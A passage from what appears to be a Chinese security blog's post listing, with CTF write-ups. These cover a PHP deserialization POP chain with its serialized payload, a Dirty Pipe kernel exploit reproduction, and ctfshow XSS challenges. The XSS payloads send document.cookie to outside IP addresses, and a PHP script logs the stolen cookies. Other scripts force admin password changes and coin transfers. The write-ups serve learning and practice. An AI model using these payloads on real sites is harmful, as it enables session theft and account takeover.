<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year_parm</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;Happy_func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string=<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> one(),<span class="string">&quot;MeMeMe&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> second();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> third();</span><br><span class="line"><span class="variable">$b</span>-&gt;object=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;filename=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;object=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$n</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$payload</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>second%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>third%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>third%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>MeMeMe%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A0%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/09/cve-2022-8047%20linux%E6%8F%90%E6%9D%83/">cve-2022-8047复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-09</time><div class="content"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CVE-2022-0847是自 5.8 以来 Linux 内核中的一个漏洞，攻击者利用该漏洞可以覆盖任意只读文件中的数据。这样将普通的权限提升至root权限，因为非特权进程可以将代码注入到根进程</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Linux Kernel版本 &gt;= 5.8<br>Linux Kernel版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a target="_blank" rel="noopener" href="https://haxx.in/files/dirtypipez.c">exp</a><br>之后在执行exp<br><img src="https://img-blog.csdnimg.cn/0d06c25f070349098794b771129bbacd.png"><br>之后运行<br><img src="https://img-blog.csdnimg.cn/1501433bef294e15b8f9e18f0771d1ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/25/ctfshow%20xss/">ctfshow xss</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-25</time><div class="content"><p>集一下可用的姿势吧，</p>
<blockquote>
<p>window.open:open() 方法用于打开一个新的浏览器窗口或查找一个已命名的窗口。<br>location.href=”/url”当前页面打开URL页面<br>windows.location.href=”/url” 当前页面打开URL页面<br>onfocus事件在对象获得焦点时发生<br> autofocus 属性规定当页面加载时 input 元素应该自动获得焦点。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;location.href=<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br><span class="line"><span class="comment"># 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>onload 事件会在页面或图像加载完成后立即发生。</p>
<p>svg标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>iframe标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p>body标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>img：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=document.createElement(<span class="string">&quot;img&quot;</span>); img.src=<span class="string">&quot;http://118.31.168.198:39543/&quot;</span>+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>利用自己的服务器在服务器页面上写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后在题目页面写入js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js代码</span></span><br><span class="line">&lt;script&gt;document.location.href=<span class="string">&#x27;http://xxx/a.php?cookie=&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后在服务器内得到flag</p>
<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>script标签被过滤，可以用body</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web-318"><a href="#web-318" class="headerlink" title="web 318"></a>web 318</h2><p>过滤了img,用317得payload</p>
<h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>同上</p>
<h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>本题空格被过滤<br>利用%09得url解码进行解题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body	onload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><p>同上</p>
<h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><p>又把iframe给过滤了<br>poc同上</p>
<h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>同上</p>
<h2 id="web324-326"><a href="#web324-326" class="headerlink" title="web324~326"></a>web324~326</h2><p>同上</p>
<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>存储型XSS。首先就是poster必须是admin才能发送成功，其次就是XSS的触发点应该是sender和content都可以。直接用一下xss平台的payload就可以了。（不要用img，img似乎被过滤）<br><img src="https://img-blog.csdnimg.cn/5048b8ef24b94db991a3b4773d66cf4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>看到后先注册，之后发现必须是管理员才能查看<br>于是注册时利用下面的作为密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>之后在服务器上看到管理员cookie<br>利用cookie进入管理员页面<br>之后发现会出现跳闪，利用bp抓包一步一步的放包即可得到flag</p>
<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>方法同上，能得到cookie但是还是访问不了页面</p>
<p>原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p>
<p>这里不行了呀这里，看了下wp是用js</p>
<p>这样，看视频<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1gi4y1A76p">bili</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        window.location.href=<span class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>（ctfshow中间有+号，是因为防止把自己写的js给发送过去）<br>这样可以得到管理员密码<br>或者在show后加{可得到flag</p>
<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>本题利用上一题的做法无法实现<br>经过观察，发现存在修改密码，经测试，可以发现可以修改admin的密码<br>利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>（注意要将该js放在用户名中进行利用）<br>之后登录admin得到flag</p>
<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>本题和上一题相似<br>但本题是POST传参<br>看源码得到<br><img src="https://img-blog.csdnimg.cn/9b42d1a9da8d4df396c34684765e34c2.png" alt="在这里插入图片描述"><br>于是制作js修改管理员密码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>之后登录的到flag</p>
<h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>打开题目后，发现可以买flag<br>向admin转账，-10000，发现自己账号金币有10000多可以购买flag</p>
<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>（由于后台逻辑错误，导致转金币可以不消耗自己的金币）<br>不停给自己转金币，只要不超过自己的余额就一直转，直到得到flag</p>
<p>也可以创建一个账号，利用js漏洞让管理员给自己转金币<br>paylaod</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;111&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>




</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/19/FilesystemIterator%20%E7%B1%BB%E8%AF%BB%E7%9B%AE%E5%BD%95%E7%9A%84%E4%B8%80%E9%81%93%E5%B8%88%E5%82%85%E5%87%BA%E7%9A%84%E9%A2%98/">FilesystemIterator类读目录的一道师傅出的题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-19</time><div class="content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par4</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par0</span>,<span class="variable">$par1</span>,<span class="variable">$par2</span>,<span class="variable">$par3</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par0 = <span class="variable">$par0</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par1 = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par2 = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par3 = <span class="variable">$par3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newOne</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;par0(<span class="keyword">$this</span> -&gt; par1,<span class="keyword">$this</span> -&gt; par2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yigei</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Plz  &#x27;</span>.<span class="keyword">$this</span> -&gt; par4.<span class="string">&#x27;  try harder&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">giao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 -&gt; juts_a_function();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par1) || <span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par2)))&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; newOne();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span> -&gt; par3 === <span class="string">&#x27;unserialize&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; yigei();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; giao();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">$this</span> -&gt; par2.<span class="string">&#x27;hint.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
<p>首先有个 hint.php 在__wakeup 中，直接 php 伪协议拼接读取<br><img src="https://img-blog.csdnimg.cn/3daa29b2f4e34e199d00e85dbe019650.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到提示<br><img src="https://img-blog.csdnimg.cn/ab2dda6e4f194953a54d1903b778a042.png" alt="在这里插入图片描述"><br>之后利用<br><img src="https://img-blog.csdnimg.cn/057fab99be86486f90c35cb887fa5e7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>做poc<br><img src="https://img-blog.csdnimg.cn/1e44d4552fd745f682327f9bed2d85d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现下面没啥重要的<br>经师傅提醒<br>利用glob协议<br><img src="https://img-blog.csdnimg.cn/06ed7adf94f947b19e0a5273182b6ca6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到在flll44ggg-secret.txt<br>访问得到<br><img src="https://img-blog.csdnimg.cn/84b10b72b44544a18376644eb6697d7a.png" alt="在这里插入图片描述"><br><a target="_blank" rel="noopener" href="http://blog.m1kael.cn/index.php/archives/12/">PHP内置类关于反序列化的应用</a><br><a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/5ba4634b.html">【POP链&amp;原生类&amp;伪协议】记一道2021浙江省赛的Web题</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>